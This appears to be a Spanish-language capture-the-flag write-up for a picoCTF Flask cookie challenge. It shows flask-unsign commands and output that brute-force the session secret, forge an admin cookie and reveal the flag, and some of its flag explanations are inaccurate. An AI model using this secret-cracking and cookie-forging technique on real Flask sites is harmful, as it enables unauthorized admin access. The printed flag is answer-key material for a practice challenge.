## Descripción  
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)

## Datos de Acceso al Nivel
user: carlosof / kali 
password:

## Solución
- Descargamos el archivo .py que nos proporciona el reto y lo analizamos.
- Podemos darnos cuenta de la lista de galletas, en alguna de ellas esta la cookie que necesitamos.
- En nuestro entrono de pruebas (kali, en mi caso) debemos descargar la herramienta flask.
	- Para evitar problemas, debemos de instalar pipx.
		- `sudo apt install pipx` adicionalmente agregamos los siguientes comandos  `pipx ensurepath` y   `source ~/.zshrc`
- Una ves teniendo la herramienta, podemos almaceanar el nombre de las cookies en un archivo, en este caso `cookies`: 
```bash
┌──(kali㉿kali)-[~/retosWeb]
└─$ echo "snickerdoodle          
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia" > cookies.txt
```
- Una vez tenemos el archivo, es momento de utilizar la herramienta y escribimos el siguiente comando `flask-unsign -u --server http://mercury.picoctf.net:44693/ --wordlist cookies.txt `

	- - **`flask-unsign`**: Es la herramienta que se utiliza para manipular o desfirmar cookies en aplicaciones Flask.
    
	- **`-u`**: Este flag indica que se va a utilizar una URL específica. Es una opción común para indicar la dirección del servidor al que se está apuntando.
    
	- **`--server http://mercury.picoctf.net:44693/`**: Esta opción especifica la URL del servidor donde se encuentra la aplicación Flask que se desea analizar.
    
	- **`--wordlist cookies.txt`**: Este parámetro indica que se va a utilizar un archivo de texto (`cookies.txt`) como lista de palabras.
```bash
┌──(kali㉿kali)-[~/retosWeb]
└─$ flask-unsign -u --server http://mercury.picoctf.net:44693/ --wordlist cookies.txt 
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZvsaZA.PTv7o6qkcxczks8ZfGe7HnqKqtI
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
```
- Ahora escribimos el siguiente comando `flask-unsign -s -c "{'very_auth': 'admin'}" -S butter`
	- - **`-s`**: Indica que se desea desfirmar o manipular la cookie.
    
	- **`-c "{'very_auth': 'admin'}"`**: Especifica que se quiere modificar la cookie para que el valor del campo `very_auth` sea `'admin'`. Esto sugiere que se intenta elevar privilegios o acceder a funcionalidades administrativas.
    
	- **`-S butter`**: Indica la clave secreta que se encontró previamente (`butter`), que se usará para firmar la cookie modificada.
```bash
┌──(kali㉿kali)-[~/retosWeb]
└─$ flask-unsign -s -c "{'very_auth': 'admin'}" -S butter
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvseeg.sLz_TB4HZuUkpDQgDJGTQxe4su8
```
- Ya hemos obtenido la nueva cookie, ahora nos dirijimos a la pagina web y con la herramienta `cookie-editor` cambiamos el valor de la cookie anterior por la nueva que obtuvimos `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvseeg.sLz_TB4HZuUkpDQgDJGTQxe4su8`.
- Recargamos la pagina y obtenemos la bandera.
- **Flag**: `picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}`
## Notas Adicionales
- **Pipx** es una herramienta de Python que permite instalar y ejecutar aplicaciones Python de manera aislada. Su principal propósito es facilitar la gestión de herramientas de línea de comandos que son escritas en Python.
## Referencias 
https://play.picoctf.org/practice/challenge/177
http://mercury.picoctf.net:44693/display